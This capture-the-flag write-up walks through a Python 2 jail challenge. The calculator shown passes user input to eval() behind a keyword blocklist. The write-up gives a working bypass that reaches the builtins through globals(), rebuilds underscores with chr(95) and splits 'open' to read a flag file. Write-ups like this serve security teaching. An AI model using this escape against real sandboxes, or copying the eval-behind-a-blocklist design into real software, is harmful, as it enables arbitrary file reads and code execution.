# [PyJail2](http://s1063.vdi.mipt.ru:8000/challenges#PyJail2) 
You can find flag in `/home/pyjail2/flag.txt`

```python
#!/usr/bin/python2.7 -u

print("Calculator v0.1")

expr = raw_input("expression = ")

bad_words = ['import', 'eval', 'exec', 'os', 'sys', 'input', 'open', '_']

for bad_word in bad_words:
    if bad_word in expr:
        print("Go away!")
        exit(0)

print(expr + " = " + str(eval(expr)))

```

# Solution
We need somehow run line of code like: `list(open('<filename>', 'r'))`, but `open` is in `bad_words` list.
Let's see at `globals()`:
```python
globals() = {'bad_words': ['import', 'eval', 'exec', 'os', 'sys', 'input', 'open', '_'], 
             '__builtins__': <module '__builtin__' (built-in)>, 
			 'expr': 'globals()', 
			 '__file__': './pyjail2', 
			 '__package__': None, 
			 '__name__': '__main__', 
			 'bad_word': '_', 
			 '__doc__': None
}
```

So `__builtins__` can be retrieved via `globals()['__builtins__']`, but we cannot use `_`, so let's change it with `chr(95)`:
`globals()[2 * chr(95) + 'builtins' + 2 * chr(95)]`.

To get a dictionary of method's names and methods itself we can use `vars`:
`vars(globals()[2 * chr(95) + 'builtins' + 2 * chr(95)])`, and to get an open function do same trick:
`vars(globals()[2 * chr(95) + 'builtins' + 2 * chr(95)])['ope' + 'n']`.
The whole line is:
`list(vars(globals()[2 * chr(95) + 'builtins' + 2 * chr(95)])['ope' + 'n']('/home/pyjail2/flag.txt', 'r'))` and the response is:
`list(vars(globals()[2 * chr(95) + 'builtins' + 2 * chr(95)])['ope' + 'n']('/home/pyjail2/flag.txt', 'r')) = ['flag{ja1l_esc4ped?}\n']`, so

**Answer**: `flag{ja1l_esc4ped?}`